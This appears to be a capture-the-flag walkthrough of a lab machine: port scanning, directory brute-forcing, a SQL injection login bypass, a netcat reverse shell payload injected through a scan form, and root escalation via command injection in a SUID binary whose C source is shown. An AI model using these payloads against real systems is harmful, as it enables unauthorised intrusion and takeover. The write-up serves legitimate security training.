1. Port Scanning

I began with a full port scan using Nmap:

nmap -A -sC -sV -p- -T5 <IP> -o nmap.txt


Results:

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.17)


The web server is running Werkzeug 0.14.1 on Python 2.7.17.
I checked for public exploits or CVEs related to this exact version but didn’t find anything directly exploitable.

2. Directory Enumeration

Since port 8080 is hosting an HTTP server, I performed directory brute-forcing with Dirb:

dirb http://192.168.1.165:8080 /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt


Found directories:

/console

/login

/output

/scan

3. Initial Authentication Bypass (SQL Injection)

Accessing /login displayed a login form.
Testing a basic SQL injection payload:

" or "pawn"="pawn


This bypassed authentication successfully and granted access to the /scan section, where I found a functional web shell interface.

4. Remote Command Execution → Reverse Shell

Inside the scan console’s input field (RCE entry point), I executed a reverse shell payload.
I set up a listener on my machine:

nc -lvnp 4444


Payload used (from RevShells.com):

; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.138 4444 >/tmp/f


This successfully gave me an interactive shell as the scanner user.

5. Privilege Escalation

Inside scanner’s home directory, I found a suspicious binary:

-rwsr-xr-x 1 root scanner 8576 Oct 24 2018 update_cloudav


It’s owned by root, and has the SUID bit, meaning it runs as root.

Reading the source:

char *freshclam="/usr/bin/freshclam";

if (argc < 2){
    printf("This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n");
    return 1;
}

char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
sprintf(command, "%s %s", freshclam, argv[1]);
setgid(0);
setuid(0);
system(command);


This binary:

drops privileges to root

builds a shell command unsafely (system())

appends user input directly

Meaning: command injection with root permissions is possible.

6. Exploiting the SUID Binary

Executed:

./update_cloudav "; /bin/bash"


Although freshclam threw an error due to a locked log file, my injected command executed anyway.
Checking privileges:

id
uid=0(root) gid=0(root) groups=0(root),1001(scanner)


✔ ROOT OBTAINED
